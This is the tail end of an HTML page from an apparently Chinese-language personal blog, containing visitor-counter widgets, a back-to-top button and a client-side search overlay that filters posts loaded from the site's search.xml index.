  <span id="busuanzi_container_site_pv" style="display: none;">
    <i class="fa-solid fa-chart-line"></i> 总访问量: <span id="busuanzi_value_site_pv" style="color: var(--color-primary); font-weight: bold;"></span> 次
  </span>
  <span style="margin: 0 10px; opacity: 0.3;">|</span>
  <span id="busuanzi_container_site_uv" style="display: none;">
    <i class="fa-solid fa-users"></i> 总访客数: <span id="busuanzi_value_site_uv" style="color: var(--color-primary); font-weight: bold;"></span> 人
  </span>

  <div style="margin-top: 10px;">
    <a target="_blank" rel="noopener" href="https://info.flagcounter.com/xxxx" style="display:inline-block;">
      <img src="https://s11.flagcounter.com/mini/licivo/bg_FFFFFF/txt_000000/border_CCCCCC/flags_0/" alt="Flag Counter" border="0">
    </a>
    </div>
</div>
    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
        <i class="fa-solid fa-angle-up"></i>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.classList.remove('hide')
        } else {
            btn.classList.add('hide')
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>

  <script src="/js/light-dark-switch.js"></script>

  <div id="search-form-wrap" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(5px); z-index: 99999; justify-content: center; align-items: flex-start; padding-top: 80px;">
    <div class="search-container" style="background: var(--color-background, #fff); width: 90%; max-width: 600px; max-height: 80vh; border-radius: 16px; padding: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.2); display: flex; flex-direction: column; overflow: hidden;">
      <div class="search-header" style="display: flex; align-items: center; border-bottom: 1px solid rgba(0,0,0,0.1); padding-bottom: 15px; margin-bottom: 10px;">
        <input type="text" id="search-input" style="flex: 1; border: none; outline: none; font-size: 1.1rem; background: transparent; color: var(--color-text);" placeholder="搜索文章标题或内容...">
        <i id="search-close-btn" class="fa-solid fa-xmark" style="cursor: pointer; color: #999; font-size: 1.2rem; margin-left: 10px;"></i>
      </div>
      <div id="search-result" style="overflow-y: auto; flex: 1;">
        </div>
    </div>
  </div>

  <style>
    .search-result-list { list-style: none; padding: 5px; margin: 0; }
    .search-result-item { padding: 15px; margin-bottom: 12px; background: rgba(0,0,0,0.02); border-radius: 10px; transition: all 0.2s ease; border: 1px solid transparent; }
    .search-result-item:hover { background: rgba(0,0,0,0.04); box-shadow: 0 4px 12px rgba(0,0,0,0.08); transform: translateY(-2px); border-color: var(--color-primary); }
    .search-result-title { font-size: 1.1rem; font-weight: 600; color: var(--color-primary, #4a90e2); text-decoration: none; display: block; margin-bottom: 8px; }
    .search-result-content { font-size: 0.95rem; color: #666; line-height: 1.6; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
    .search-keyword { color: #e91e63; background: rgba(233, 30, 99, 0.08); padding: 0 4px; border-radius: 4px; font-weight: bold; font-style: normal; }
    
    /* 深色模式适配 */
    [data-theme="dark"] .search-container { background: #222; border: 1px solid #444; }
    [data-theme="dark"] .search-result-item { background: rgba(255,255,255,0.05); }
    [data-theme="dark"] .search-result-item:hover { background: rgba(255,255,255,0.08); }
    [data-theme="dark"] .search-result-content { color: #aaa; }
    
    /* 滚动条美化 */
    #search-result::-webkit-scrollbar { width: 6px; }
    #search-result::-webkit-scrollbar-thumb { background: #ccc; border-radius: 3px; }
  </style>

  <script>
    document.addEventListener('DOMContentLoaded', function () {
      const searchBtn = document.getElementById('nav-search-btn');
      const searchForm = document.getElementById('search-form-wrap');
      const searchClose = document.getElementById('search-close-btn');
      const searchInput = document.getElementById('search-input');
      const searchResult = document.getElementById('search-result');

      if (!searchBtn || !searchForm) return;

      // 1. 弹出逻辑：增加 e.preventDefault() 解决跳转问题
      searchBtn.onclick = function(e) {
        e.preventDefault(); // 阻止默认的跳转到页面末尾的行为
        searchForm.style.display = 'flex';
        searchInput.focus();
        if (!window.searchData) loadSearchData();
      };

      searchClose.onclick = () => { searchForm.style.display = 'none'; };
      
      // 点击遮罩层（弹窗外）关闭
      searchForm.onclick = (e) => { 
        if(e.target === searchForm) searchForm.style.display = 'none'; 
      };

      // 按下 Esc 键关闭
      document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape') searchForm.style.display = 'none';
      });

      // 2. 搜索逻辑 (Local Search)
      async function loadSearchData() {
        searchResult.innerHTML = '<div style="padding:20px; text-align:center; color:#999;">正在加载索引...</div>';
        try {
          const res = await fetch('/search.xml');
          const text = await res.text();
          const xml = new DOMParser().parseFromString(text, "text/xml");
          window.searchData = Array.from(xml.querySelectorAll('entry')).map(entry => ({
            title: entry.querySelector('title').textContent,
            content: entry.querySelector('content').textContent.replace(/<[^>]+>/g, ''), // 过滤 HTML 标签
            url: entry.querySelector('url').textContent
          }));
          searchResult.innerHTML = '<div style="padding:20px; text-align:center; color:#999;">索引加载完成</div>';
        } catch (err) {
          searchResult.innerHTML = '<div style="padding:20px; text-align:center; color:red;">索引加载失败，请检查 search.xml</div>';
        }
      }

      searchInput.oninput = function() {
        const val = this.value.trim().toLowerCase();
        if (val.length < 2) { searchResult.innerHTML = ""; return; }
        
        const results = window.searchData.filter(data => 
          data.title.toLowerCase().includes(val) || data.content.toLowerCase().includes(val)
        );

        if (results.length === 0) {
          searchResult.innerHTML = '<div style="padding:20px; text-align:center; color:#999;">未找到相关文章</div>';
          return;
        }

        searchResult.innerHTML = `<ul class="search-result-list">${results.map(data => `
          <li class="search-result-item">
            <a href="${data.url}" class="search-result-title">${data.title.replace(new RegExp(val, 'gi'), m => `<em class="search-keyword">${m}</em>`)}</a>
            <p class="search-result-content">${data.content.substring(0, 150)}...</p>
          </li>`).join('')}</ul>`;
      };
    });
  </script>
  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
</body>
</html>